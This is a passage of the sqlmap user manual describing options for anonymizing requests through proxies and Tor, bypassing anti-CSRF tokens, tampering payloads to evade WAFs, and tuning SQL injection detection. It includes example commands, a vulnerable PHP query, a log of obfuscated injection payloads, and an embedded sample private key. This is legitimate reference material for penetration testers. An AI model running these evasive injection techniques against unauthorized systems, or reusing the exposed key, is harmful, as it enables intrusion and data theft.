/>VLU28oeJwQidL9vTRoGJR5pfBU6Mhu33Cv6RuVEJAfMWEKYDSbqbrEyy1zUiNTcG<br />mEd026Peq0SPRvsKsVb6K+EHVF3r+6ExXHEctPRbh2GIzi2kCQMkdHDg+DhmieQ9<br />9Haxk9IREJZTo2vC1ohvM5M/yubw4iwgMlDaW+4s82OgOcCLjewbPLFZU5gMV+8W<br />XLKUttUYwV79duPbEvG9S1soNFHhu/MOcNiKJpH2zSegd9Dk5/OJRGX5xEiv7AyL<br />4shQLpAqn5kuZcm2K+ib/4x/Rw2yT1Slh2tQIi8RcwlYyycOrSqvhW7vvdqkblbY<br />mQQyR2ChAgMBAAECggEBAIqvMveC1cOCCksbi7cQeNVYxvtcFT0e/LwkwQS7gat/<br />anmQTT2APrJyemEFPkQK76KNlMQMsaLEP+p28IOVydjvin5Aq8tTs1uK6Fw8Kfya<br />elt5X3eCHZ3lgskuljW/nIcsfI08o9cJuxT5hB6yvmPDTQos+nMMYy1KEcv1LQd8<br />Y+QAmVQqMF5Nyf8Q6op6hWZIIJY5NDbRE0zYzhGcHWg2798Dx1sO0HT6TD8cNP8H<br />AVp/V21tzpmFpe0A7NajgYEjkij6fg+6mG0j0WZdWymYXDeiTdDpwzs/SPRevBLn<br />Okp/6vqtdekMeYL591MNBl8GRZpJW9gNLRX7vQ6YYAECgYEAxGV9e85GpLUd/uUb<br />1MvGajd+HtN/uoWH1ySG34vi3q/dDKBehry2yoDUosxXf9vbH0IrvaXnO8yXGflS<br />wb2TELLezGWbw6kPaw2XIgL4elO5TPh2rNJwz1wOhv3FT2XSGJbXx/CED3mL7MGs<br />qwRU/bRrNV7RmzV2veThlLCLjZECgYEAw8jm7vOzQQnqEjs0wlfJmzOyFqilYvEP<br />8v7HxDv1M7e7M0TqLECET9VlQE5spGuzEWN7/iMtE8xxnz2n/vGnGAV8qv1LJYrA<br />TWQMTIC6V9/jKM8wNOfT7Eh1rJ1cty87yokXpy/cdmkv7yxb1b2zuBk8/1nlYqA0<br />5uqb345eWhECgYEAmoXv0TVfR8BpNWA2IZujJXc7+C0YVj0xwAixRbneaq+cEI8t<br />UH2ypGnw45Y7UhI9ub5qg/DAmsBCMuGER4NM7tqNiex4Pd4Kj4RF4TDNKBIvvWvQ<br />k/GPaNdZZsTMNcg7IbWtWVbX0QUlHsbTgEsMRAFsSLWt3ZyXLJmlE0REyMECgYEA<br />oCqEscrwRC7GLK/+01ZZ+fvqnxrMYgrvj0zbRDAAwpR2MtUX9ae6Fk1vDZKa0k/B<br />KGKIlzlTsTS5ZxpbivdKSR6EBKY+ibHe6/EDFrrgtu7TuRj2SPG2rz//9Hyv0rRz<br />Z5eLoBxJcR1QN4vEfTE6C0uqWQPD4lFJtfcMGXEwwuECgYAK+4gwPBlrKClrRtDc<br />7Fnq8RLYeZRbM5WEmTHfRnlYylniMsj2K20H8ln8pdOqCE4iJn0SezIQIaAtcwMP<br />WQt15kgJgLwM/uBtqDeWRpTEotVMFXQbZImobjpXUhTqu0NWBwbypM/zarfRWPJ4<br />fJkrlA16caVj3qGaX1lkm06OAA==<br />-----END PRIVATE KEY-----<br />-----BEGIN CERTIFICATE-----<br />MIIDXTCCAkWgAwIBAgIJALTHPlkIs/+KMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV<br />BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX<br />aWRnaXRzIFB0eSBMdGQwHhcNMTgwODIyMDc0NTQxWhcNMTkwODIyMDc0NTQxWjBF<br />MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50<br />ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB<br />CgKCAQEAljNvCdbmtgyDX1S1NvKHicEInS/b00aBiUeaXwVOjIbt9wr+kblRCQHz<br />FhCmA0m6m6xMstc1IjU3BphHdNuj3qtEj0b7CrFW+ivhB1Rd6/uhMVxxHLT0W4dh<br />iM4tpAkDJHRw4Pg4ZonkPfR2sZPSERCWU6NrwtaIbzOTP8rm8OIsIDJQ2lvuLPNj<br />oDnAi43sGzyxWVOYDFfvFlyylLbVGMFe/Xbj2xLxvUtbKDRR4bvzDnDYiiaR9s0n<br />oHfQ5OfziURl+cRIr+wMi+LIUC6QKp+ZLmXJtivom/+Mf0cNsk9UpYdrUCIvEXMJ<br />WMsnDq0qr4Vu773apG5W2JkEMkdgoQIDAQABo1AwTjAdBgNVHQ4EFgQUVvHI/2qF<br />kmRCEWlWB+ZvJzWTnUkwHwYDVR0jBBgwFoAUVvHI/2qFkmRCEWlWB+ZvJzWTnUkw<br />DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAg5tmkM75/NEEymu0ublj<br />c2R1/ZxwbKMjg98KxLqGFJbPVRG0qgIy+uc+Gvh6FEgPF22i4L9DROfuDQW3YSJ6<br />x3JnJxLsU+jjXxtN7hNwoQziQkicKr0y47TjqOKLlBlKTbdnr74nJXSYQhi4qEFE<br />qgrUG7ScitgLvcf2sDVf9L2SUsH5iRK+HlgYEtSKhUl5SkLapcUUF+GmectUOkm7<br />m7Z8gelenVUerLojnQL2avKD07hWTTGkgX2PV8hdun0WIvBLWAcJN+6T9sdakJZZ<br />qJjFQBXjcxwgVe0vB0vJmqa5lj9OymQnBMjp+3zpUtDJNH2M1qySbU6tGEX1wsW/<br />VA==<br />-----END CERTIFICATE-----<br /></code><br /><br /><br /><br /><h3>Ignore (problematic) HTTP error code</h3><br />Option <code>--ignore-code</code><br />In case that you want to test the site that occasionally returns HTTP  error code that causes problems to regular sqlmap run (e.g. 401  (Unauthorized)), while you want to ignore it and continue on with tests,  you can use option <code>--ignore-code</code><br /><br /><br /><br /><h3>HTTP(S) proxy</h3><br />Options and switch: <code>--proxy</code>, <code>--proxy-cred</code>, <code>--proxy-file</code> and <code>--ignore-proxy</code><br />It is possible to provide an HTTP(S) proxy address to pass by the HTTP(S) requests to the target URL with option <code>--proxy</code>. The syntax of HTTP(S) proxy value is <code>http://url:port</code>.<br />If the HTTP(S) proxy requires authentication, you can provide the credentials in the format <code>username:password</code> to the option <code>--proxy-cred</code>.<br />In case that you want to use (disposable) proxy list, skipping to the  next proxy on any sign of a connection problem (e.g. blocking of  invasive IP address), option <code>--proxy-file</code> can be used by providing filename of a file containing bulk list of proxies.<br />Switch <code>--ignore-proxy</code> should be used when you want to  run sqlmap against a target part of a local area network by ignoring the  system-wide set HTTP(S) proxy server setting.<br /><br /><br /><br /><h3>Tor anonymity network</h3><br />Switches and options: <code>--tor</code>, <code>--tor-port</code>, <code>--tor-type</code> and <code>--check-tor</code><br />If, for any reason, you need to stay anonymous, instead of passing by  a single predefined HTTP(S) proxy server, you can configure a <a href="http://www.torproject.org/">Tor client</a> together with <a href="http://www.privoxy.org">Privoxy</a> (or similar) on your machine as explained in <a href="https://www.torproject.org/docs/installguide.html.en">Tor installation guides</a>. Then you can use a switch <code>--tor</code> and sqlmap will try to automatically set Tor proxy connection settings.<br />In case that you want to manually set the type and port of used Tor proxy, you can do it with options <code>--tor-type</code> and <code>--tor-port</code> (e.g. <code>--tor-type=SOCKS5 --tor-port 9050</code>).<br />You are strongly advised to use <code>--check-tor</code> occasionally  to be sure that everything was set up properly. There are cases when  Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set  configuration) giving you a false sense of anonymity. Using this switch  sqlmap will check that everything works as expected by sending a single  request to an official <a href="https://check.torproject.org/">Are you using Tor?</a> page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.<br /><br /><br /><br /><h3>Delay between each HTTP request</h3><br />Option: <code>--delay</code><br />It is possible to specify a number of seconds to hold between each HTTP(S) request. The valid value is a float, for instance <code>0.5</code> means half a second. By default, no delay is set.<br /><br /><br /><br /><h3>Seconds to wait before timeout connection</h3><br />Option: <code>--timeout</code><br />It is possible to specify a number of seconds to wait before  considering the HTTP(S) request timed out. The valid value is a float,  for instance 10.5 means ten seconds and a half. By default <strong>30 seconds</strong> are set.<br /><br /><br /><br /><h3>Maximum number of retries when the HTTP connection timeouts</h3><br />Option: <code>--retries</code><br />It is possible to specify the maximum number of retries when the HTTP(S) connection timeouts. By default it retries up to <strong>three times</strong>.<br /><br /><br /><br /><h3>Randomly change value for given parameter(s)</h3><br />Option: <code>--randomize</code><br />It is possible to specify parameter names whose values you want to be  randomly changed during each request. Length and type are being kept  according to provided original values.<br /><br /><br /><br /><h3>Filtering targets from provided proxy log using regular expression</h3><br />Option: <code>--scope</code><br />Rather than using all hosts parsed from provided logs with option <code>-l</code>, you can specify valid Python regular expression to be used for filtering desired ones.<br />Example of valid syntax:<br /><code>$ python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;<br /></code><br /><br /><br /><br /><h3>Avoid your session to be destroyed after too many unsuccessful requests</h3><br />Options: <code>--safe-url</code>, <code>--safe-post</code>, <code>--safe-req</code> and <code>--safe-freq</code><br />Sometimes web applications or inspection technology in between  destroys the session if a certain number of unsuccessful requests is  performed. This might occur during the detection phase of sqlmap or when  it exploits any of the blind SQL injection types. Reason why is that  the SQL payload does not necessarily returns output and might therefore  raise a signal to either the application session management or the  inspection technology.<br />To bypass this limitation set by the target, you can provide any (or combination of) option:<br />◇ <code>--safe-url</code>: URL address to visit frequently during testing.<br />◇ <code>--safe-post</code>: HTTP POST data to send to a given safe URL address.<br />◇ <code>--safe-req</code>: Load and use safe HTTP request from a file.<br />◇ <code>--safe-freq</code>: Test requests between two visits to a given safe location.<br /><br />This way, sqlmap will visit every a predefined number of requests a certain <em>safe</em> URL without performing any kind of injection against it.<br /><br /><br /><br /><h3>Turn off URL encoding of parameter values</h3><br />Switch: <code>--skip-urlencode</code><br />Depending on parameter placement (e.g. GET) its value could be URL  encoded by default. In some cases, back-end web servers do not follow  RFC standards and require values to be send in their raw non-encoded  form. Use <code>--skip-urlencode</code> in those kind of cases.<br /><br /><br /><br /><h1>Bypass anti-CSRF protection</h1><br />Options: <code>--csrf-token</code> and <code>--csrf-url</code><br />Lots of sites incorporate anti-CSRF protection in form of tokens,  hidden field values that are randomly set during each page response.  sqlmap will automatically try to recognize and bypass that kind of  protection, but there are options <code>--csrf-token</code> and <code>--csrf-url</code> that can be used to further fine tune it. Option <code>--csrf-token</code>  can be used to set the name of the hidden value that contains the  randomized token. This is useful in cases when web sites use  non-standard names for such fields. Option <code>--csrf-url</code> can  be used for retrieval of the token value from arbitrary URL address.  This is useful if the vulnerable target URL doesn&#39;t contain the  necessary token value in the first place, but it is required to extract  it from some other location.<br /><br /><br /><br /><h3>Force usage of SSL/HTTPS</h3><br />Switch: <code>--force-ssl</code><br />In case that user wants to force usage of SSL/HTTPS requests toward  the target, he can use this switch. This can be useful in cases when  urls are being collected by using option <code>--crawl</code> or when Burp log is being provided with option <code>-l</code>.<br /><br /><br /><br /><h3>Evaluate custom python code during each request</h3><br />Option: <code>--eval</code><br />In case that user wants to change (or add new) parameter values, most  probably because of some known dependency, he can provide to sqlmap a  custom python code with option <code>--eval</code> that will be evaluated just before each request.<br />For example:<br /><code>$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238\<br />20dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;<br /></code><br />Each request of such run will re-evaluate value of GET parameter <code>hash</code> to contain a fresh MD5 hash digest for current value of parameter <code>id</code>.<br /><br /><br /><br /><h2>Optimization</h2><br />These switches can be used to optimize the performance of sqlmap.<br /><br /><br /><br /><h3>Bundle optimization</h3><br />Switch: <code>-o</code><br />This switch is an alias that implicitly sets the following options and switches:<br />◇ <code>--keep-alive</code><br />◇ <code>--null-connection</code><br />◇ <code>--threads=3</code> if not set to a higher value.<br /><br />Read below for details about each switch.<br /><br /><br /><br /><h3>Output prediction</h3><br />Switch: <code>--predict-output</code><br />This switch is used in inference algorithm for sequential statistical  prediction of characters of value being retrieved. Statistical table  with the most promising character values is being built based on items  given in <code>txt/common-outputs.txt</code> combined with the knowledge  of current enumeration used. In case that the value can be found among  the common output values, as the process progresses, subsequent  character tables are being narrowed more and more. If used in  combination with retrieval of common DBMS entities, as with system table  names and privileges, speed up is significant. Of course, you can edit  the common outputs file according to your needs if, for instance, you  notice common patterns in database table names or similar.<br />Note that this switch is not compatible with <code>--threads</code> switch.<br /><br /><br /><br /><h3>HTTP Keep-Alive</h3><br />Switch: <code>--keep-alive</code><br />This switch instructs sqlmap to use persistent HTTP(s) connections.<br />Note that this switch is incompatible with <code>--proxy</code> switch.<br /><br /><br /><br /><h3>HTTP NULL connection</h3><br />Switch: <code>--null-connection</code><br />There are special HTTP request types which can be used to retrieve  HTTP response&#39;s size without getting the HTTP body. This knowledge can  be used in blind injection technique to distinguish <code>True</code> from <code>False</code> responses. When this switch is provided, sqlmap will try to test and exploit two different <em>NULL connection</em> techniques: <code>Range</code> and <code>HEAD</code>. If any of these is supported by the target web server, speed up will come from the obvious saving of used bandwidth.<br />These techniques are detailed in the white paper <a href="http://www.wisec.it/sectou.php?id=472f952d79293">Bursting Performances in Blind SQL Injection - Take 2 (Bandwidth)</a>.<br />Note that this switch is incompatible with switch <code>--text-only</code>.<br /><br /><br /><br /><h3>Concurrent HTTP(S) requests</h3><br />Option: <code>--threads</code><br />It is possible to specify the maximum number of concurrent HTTP(S) requests that sqlmap is allowed to do. This feature relies on <a href="http://en.wikipedia.org/wiki/Multithreading">multi-threading</a> concept and inherits both its pro and its cons.<br />This features applies to the brute-force switches and when the data  fetching is done through any of the blind SQL injection techniques. For  the latter case, sqlmap first calculates the length of the query output  in a single thread, then starts the multi-threading. Each thread is  assigned to retrieve one character of the query output. The thread ends  when that character is retrieved - it takes up to 7 HTTP(S) requests  with the bisection algorithm implemented in sqlmap.<br />The maximum number of concurrent requests is set to <strong>10</strong> for performance and site reliability reasons.<br />Note that this option is not compatible with switch <code>--predict-output</code>.<br /><br /><br /><br /><h2>Injection</h2><br />These options can be used to specify which parameters to test for,  provide custom injection payloads and optional tampering scripts.<br /><br /><br /><br /><h3>Testable parameter(s)</h3><br />Options: <code>-p</code>, <code>--skip</code> and <code>--param-exclude</code><br />By default sqlmap tests all GET parameters and POST parameters. When the value of <code>--level</code> is &gt;= <strong>2</strong> it tests also HTTP <code>Cookie</code> header values. When this value is &gt;= <strong>3</strong> it tests also HTTP <code>User-Agent</code> and HTTP <code>Referer</code>  header value for SQL injections. It is however possible to manually  specify a comma-separated list of parameter(s) that you want sqlmap to  test. This will bypass the dependence on value of <code>--level</code> too.<br />For instance, to test for GET parameter <code>id</code> and for HTTP <code>User-Agent</code> only, provide <code>-p &quot;id,user-agent&quot;</code>.<br />In case that user wants to exclude certain parameters from testing, he can use option <code>--skip</code>. That is especially useful in cases when you want to use higher value for <code>--level</code> and test all available parameters excluding some of HTTP headers normally being tested.<br />For instance, to skip testing for HTTP header <code>User-Agent</code> and HTTP header <code>Referer</code> at <code>--level=5</code>, provide <code>--skip=&quot;user-agent,referer&quot;</code>.<br />There is also a possibility to exclude certain parameters from  testing based on a regular expression run on their names. In those kind  of cases user can use option <code>--param-exclude</code>.<br />For instance, to skip testing for parameters which contain string <code>token</code> or <code>session</code> in their names, provide <code>--param-exclude=&quot;token|session&quot;</code>.<br /><br /><br /><br /><h3>URI injection point</h3><br />There are special cases when injection point is within the URI  itself. sqlmap does not perform any automatic test against URI paths,  unless manually pointed to. You have to specify these injection points  in the command line by appending an asterisk (<code>*</code>) (Note: Havij style <code>%INJECT HERE%</code> is also supported) after each URI point that you want sqlmap to test for and exploit a SQL injection.<br />This is particularly useful when, for instance, Apache web server&#39;s <a href="http://httpd.apache.org/docs/current/mod/mod_rewrite.html">mod_rewrite</a> module is in use or other similar technologies.<br />An example of valid command line would be:<br /><code>$ python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;<br /></code><br /><br /><br /><br /><h3>Arbitrary injection point</h3><br />Similar to URI injection point, asterisk (<code>*</code>) (Note: Havij style <code>%INJECT HERE%</code>  is also supported) can also be used to point to the arbitrary injection  point inside GET, POST or HTTP headers. Injection point can be  specified by marking it inside the GET parameter value(s) provided with  option <code>-u</code>, POST parameter value(s) provided with option <code>--data</code>, HTTP header value(s) provided with options <code>-H</code>, <code>--headers</code>, <code>--user-agent</code>, <code>--referer</code> and/or <code>--cookie</code>, or at generic place inside HTTP request loaded from file with option <code>-r</code>.<br />An example of valid command line would be:<br /><code>$ python sqlmap.py -u &quot;http://targeturl&quot; --cookie=&quot;param1=value1*;param2=value2&quot;<br /></code><br /><br /><br /><br /><h3>Force the DBMS</h3><br />Option: <code>--dbms</code><br />By default sqlmap automatically detects the web application&#39;s  back-end database management system. sqlmap fully supports the following  database management systems:<br />◇ MySQL<br />◇ Oracle<br />◇ PostgreSQL<br />◇ Microsoft SQL Server<br />◇ Microsoft Access<br />◇ IBM DB2<br />◇ SQLite<br />◇ Firebird<br />◇ Sybase<br />◇ SAP MaxDB<br />◇ Informix<br />◇ MariaDB<br />◇ Percona<br />◇ MemSQL<br />◇ TiDB<br />◇ CockroachDB<br />◇ HSQLDB<br />◇ H2<br />◇ MonetDB<br />◇ Apache Derby<br />◇ Amazon Redshift<br />◇ Vertica<br />◇ Mckoi<br />◇ Presto<br />◇ Altibase<br />◇ MimerSQL<br />◇ CrateDB<br />◇ Greenplum<br />◇ Drizzle<br />◇ Apache Ignite<br />◇ Cubrid<br />◇ InterSystems Cache<br />◇ IRIS<br />◇ eXtremeDB<br />◇ FrontBase<br /><br />If for any reason sqlmap fails to detect the back-end DBMS once a SQL  injection has been identified or if you want to avoid an active  fingeprint, you can provide the name of the back-end DBMS yourself (e.g.  <code>postgresql</code>). For MySQL and Microsoft SQL Server provide them respectively in the form <code>MySQL  &lt;version&gt;</code> and <code>Microsoft SQL Server  &lt;version&gt; </code>, where <code> &lt;version&gt;</code> is a valid version for the DBMS; for instance <code>5.0</code> for MySQL and <code>2005</code> for Microsoft SQL Server.<br />In case you provide <code>--fingerprint</code> together with <code>--dbms</code>,  sqlmap will only perform the extensive fingerprint for the specified  database management system only, read below for further details.<br />Note that this option is <strong>not</strong> mandatory and it is strongly recommended to use it <strong>only if you are absolutely sure</strong> about the back-end database management system. If you do not know it, let sqlmap automatically fingerprint it for you.<br /><br /><br /><br /><h3>Force the database management system operating system name</h3><br />Option: <code>--os</code><br />By default sqlmap automatically detects the web application&#39;s  back-end database management system underlying operating system when  this information is a dependence of any other provided switch or option.  At the moment the fully supported operating systems are:<br />◇ Linux<br />◇ Windows<br /><br />It is possible to force the operating system name if you already know it so that sqlmap will avoid doing it itself.<br />Note that this option is <strong>not</strong> mandatory and it is strongly recommended to use it <strong>only if you are absolutely sure</strong>  about the back-end database management system underlying operating  system. If you do not know it, let sqlmap automatically identify it for  you.<br /><br /><br /><br /><h3>Force usage of big numbers for invalidating values</h3><br />Switch: <code>--invalid-bignum</code><br />In cases when sqlmap needs to invalidate original parameter value (e.g. <code>id=13</code>) it uses classical negation (e.g. <code>id=-13</code>). With this switch it is possible to force the usage of large integer values to fulfill the same goal (e.g. <code>id=99999999</code>).<br /><br /><br /><br /><h3>Force usage of logical operations for invalidating values</h3><br />Switch: <code>--invalid-logical</code><br />In cases when sqlmap needs to invalidate original parameter value (e.g. <code>id=13</code>) it uses classical negation (e.g. <code>id=-13</code>). With this switch it is possible to force the usage of boolean operations to fulfill the same goal (e.g. <code>id=13 AND 18=19</code>).<br /><br /><br /><br /><h3>Force usage of random strings for invalidating values</h3><br />Switch: <code>--invalid-string</code><br />In cases when sqlmap needs to invalidate original parameter value (e.g. <code>id=13</code>) it uses classical negation (e.g. <code>id=-13</code>). With this switch it is possible to force the usage of random strings to fulfill the same goal (e.g. <code>id=akewmc</code>).<br /><br /><br /><br /><h3>Turn off payload casting mechanism</h3><br />Switch: <code>--no-cast</code><br />When retrieving results, sqlmap uses a mechanism where all entries  are being casted to string type and replaced with a whitespace character  in case of <code>NULL</code> values. That is being made to prevent any erroneous states (e.g. concatenation of <code>NULL</code>  values with string values) and to easy the data retrieval process  itself. Nevertheless, there are reported cases (e.g. older versions of  MySQL DBMS) where this mechanism needed to be turned-off (using this  switch) because of problems with data retrieval itself (e.g. <code>None</code> values are returned back).<br /><br /><br /><br /><h3>Turn off string escaping mechanism</h3><br />Switch: <code>--no-escape</code><br />In cases when sqlmap needs to use (single-quote delimited) string values inside payloads (e.g. <code>SELECT &#39;foobar&#39;</code>), those values are automatically being escaped (e.g. <code>SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)</code>).  That is being done because of two things: obfuscation of payload  content and preventing potential problems with query escaping mechanisms  (e.g. <code>magic_quotes</code> and/or <code>mysql_real_escape_string</code>) at the back-end server. User can use this switch to turn it off (e.g. to reduce payload size).<br /><br /><br /><br /><h3>Custom injection payload</h3><br />Options: <code>--prefix</code> and <code>--suffix</code><br />In some circumstances the vulnerable parameter is exploitable only if  the user provides a specific suffix to be appended to the injection  payload. Another scenario where these options come handy presents itself  when the user already knows that query syntax and want to detect and  exploit the SQL injection by directly providing a injection payload  prefix and suffix.<br />Example of vulnerable source code:<br /><code>$query = &quot;SELECT * FROM users WHERE id=(&#39;&quot; . $_GET[&#39;id&#39;] . &quot;&#39;) LIMIT 0, 1&quot;;<br /></code><br />To detect and exploit this SQL injection, you can either let sqlmap detect the <strong>boundaries</strong> (as in combination of SQL payload prefix and suffix) for you during the detection phase, or provide them on your own.<br />For example:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\<br />?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;<br />[...]<br /></code><br />This will result in all sqlmap requests to end up in a query as follows:<br /><code>$query = &quot;SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1&quot;;<br /></code><br />Which makes the query syntactically correct.<br />In this simple example, sqlmap could detect the SQL injection and  exploit it without need to provide custom boundaries, but sometimes in  real world application it is necessary to provide it when the injection  point is within nested <code>JOIN</code> queries for instance.<br /><br /><br /><br /><h3>Tamper injection data</h3><br />Option: <code>--tamper</code><br />sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their <code>CHAR()</code>-alike representation.<br />This option can be very useful and powerful in situations where there  is a weak input validation mechanism between you and the back-end  database management system. This mechanism usually is a self-developed  input validation routine called by the application source code, an  expensive enterprise-grade IPS appliance or a web application firewall  (WAF). All buzzwords to define the same concept, implemented in a  different way and costing lots of money, usually.<br />To take advantage of this option, provide sqlmap with a  comma-separated list of tamper scripts and this will process the payload  and return it transformed. You can define your own tamper scripts, use  sqlmap ones from the <code>tamper/</code> folder or edit them as long as you concatenate them comma-separated as value of the option <code>--tamper</code> (e.g. <code>--tamper=&quot;between,randomcase&quot;</code>).<br />The format of a valid tamper script is as follows:<br /><code># Needed imports<br />from lib.core.enums import PRIORITY<br /><br /># Define which is the order of application of tamper scripts against<br /># the payload<br />__priority__ = PRIORITY.NORMAL<br /><br />def tamper(payload):<br />    &#39;&#39;&#39;<br />    Description of your tamper script<br />    &#39;&#39;&#39;<br /><br />    retVal = payload<br /><br />    # your code to tamper the original payload<br /><br />    # return the tampered payload<br />    return retVal<br /></code><br />You can check valid and usable tamper scripts in the <code>tamper/</code> directory.<br />Example against a MySQL target assuming that <code>&gt;</code> character, spaces and capital <code>SELECT</code> string are banned:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\<br />tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3<br /><br />[hh:mm:03] [DEBUG] cleaning up configuration parameters<br />[hh:mm:03] [INFO] loading tamper script &#39;between&#39;<br />[hh:mm:03] [INFO] loading tamper script &#39;randomcase&#39;<br />[hh:mm:03] [INFO] loading tamper script &#39;space2comment&#39;<br />[...]<br />[hh:mm:04] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;<br />[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092<br />[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057<br />[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041<br />[...]<br />[hh:mm:04] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause<br />&#39;<br />[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONC<br />AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/<br />**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/info<br />rmation_schema.tables/**/group/**/bY/**/x)a)<br />[hh:mm:04] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt;= 5.0 AND error-based - WHERE or<br /> HAVING clause&#39; injectable <br />[...]<br /></code><br /><br /><br /><br /><h2>Detection</h2><br />These options can be used to customize the detection phase.<br /><br /><br /><br /><h3>Level</h3><br />Option: <code>--level</code><br />This option requires an argument which specifies the level of tests to perform. There are <strong>five</strong> levels. The default value is <strong>1</strong> where limited number of tests (requests) are performed. Vice versa, level <strong>5</strong>  will test verbosely for a much larger number of payloads and boundaries  (as in pair of SQL payload prefix and suffix). The payloads used by  sqlmap are specified in the textual file <code>xml/payloads.xml</code>.  Following the instructions on top of the file, if sqlmap misses an  injection, you should be able to add your own payload(s) to test for  too!<br />Not only this option affects which payload sqlmap tries, but also  which injection points are taken in exam: GET and POST parameters are <strong>always</strong> tested, HTTP Cookie header values are tested from level <strong>2</strong> and HTTP User-Agent/Referer headers&#39; value is tested from level <strong>3</strong>.<br />All in all, the harder it is to detect a SQL injection, the higher the <code>--level</code> must be set.<br />It is strongly recommended to higher this value before reporting to  the mailing list that sqlmap is not able to detect a certain injection  point.<br /><br /><br /><br /><h3>Risk</h3><br />Option: <code>--risk</code><br />This option requires an argument which specifies the risk of tests to perform. There are <strong>three</strong> risk values. The default value is <strong>1</strong>  which is innocuous for the majority of SQL injection points. Risk value  2 adds to the default level the tests for heavy query time-based SQL  injections and value 3 adds also <code>OR</code>-based SQL injection tests.<br />In some instances, like a SQL injection in an <code>UPDATE</code> statement, injecting an <code>OR</code>-based  payload can lead to an update of all the entries of the table, which is  certainly not what the attacker wants. For this reason and others this  option has been introduced: the user has control over which payloads get  tested, the user can arbitrarily choose to use also potentially  dangerous ones. As per the previous option, the payloads used by sqlmap  are specified in the textual file <code>xml/payloads.xml</code> and you are free to edit and add your owns.<br /><br /><br /><br /><h3>Page comparison</h3><br />Options: <code>--string</code>, <code>--not-string</code>, <code>--regexp</code> and <code>--code</code><br />By default the distinction of a <code>True</code> query from a <code>False</code>  one (rough concept behind boolean-based blind SQL injection  vulnerabilities) is done by comparing the injected requests page content  with the original not injected page content. Not always this concept works because sometimes the page content changes  at each refresh even not injecting anything, for instance when the page  has a counter, a dynamic advertisement banner or any other part of the  HTML which is rendered dynamically and might change in time not only  consequently to user&#39;s input. To bypass this limit, sqlmap tries hard to  identify these snippets of the response bodies and deal accordingly.  Sometimes it may fail, that is why the user can provide a string (<code>--string</code> option) which <strong>should</strong> be present on original page (though it is not a requirement) <strong>and</strong> on all True injected query pages, but that it is <strong>not</strong> on the False ones. Instead of static string, the user can provide a regular expression (<code>--regexp</code> option). Alternatively, user can provide a string (<code>--not-string</code> option) which is <strong>not</strong> present on original page <strong>and</strong> not on all True injected query pages, but appears <strong>always</strong> on False ones.<br />Such data is easy for an user to retrieve, simply try to inject into  the affected parameter an invalid value and compare manually the  original (not injected) page content with the injected wrong page  content. This way the distinction will be based upon string presence or  regular expression match.<br />In cases when user knows that the distinction of a <code>True</code> query from a <code>False</code> one can be done using HTTP code (e.g. <code>200</code> for <code>True</code> and <code>401</code> for <code>False</code>), he can provide that information to sqlmap (e.g. <code>--code=200</code>).<br />Switches: <code>--text-only</code> and <code>--titles</code><br />In cases when user knows that the distinction of a <code>True</code> query from a <code>False</code> one can be done using HTML title (e.g. <code>Welcome</code> for <code>True</code> and <code>Forbidden</code> for <code>False</code>), he can turn turn on title-based comparison using switch <code>--titles</code>.<br />In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses&#39; body, you can filter pages (switch <code>--text-only</code>) just for their textual content. This way, in a good number of cases, you can automatically tune the detection engine.<br /><br /><br /><br /><h2>Techniques</h2><br />These options can be used to tweak testing of specific SQL injection techniques.<br /><br /><br /><br /><h3>SQL injection techniques to test for</h3><br />Option: <code>--technique</code><br />This option can be used to specify which SQL injection type to test for. By default sqlmap tests for <strong>all</strong> types/techniques it supports.<br />In certain situations you may want to test only for one or few  specific types of SQL injection thought and this is where this option  comes into play.<br />This option requires an argument. Such argument is a string composed by any combination of <code>B</code>, <code>E</code>, <code>U</code>, <code>S</code>, <code>T</code> and <code>Q</code> characters where each letter stands for a different technique:<br />◇ <code>B</code>: Boolean-based blind<br />◇ <code>E</code>: Error-based<br />◇ <code>U</code>: Union query-based<br />◇ <code>S</code>: Stacked queries<br />◇ <code>T</code>: Time-based blind<br />◇ <code>Q</code>: Inline queries<br /><br />For instance, you can provide <code>ES</code> if you want to test for and exploit error-based and stacked queries SQL injection types only. The default value is <code>BEUSTQ</code>.<br />Note that the string must include stacked queries technique letter, <code>S</code>, when you want to access the file system, takeover the operating system or access Windows registry hives.<br /><br /><br /><br /><h3>Seconds to delay the DBMS response for 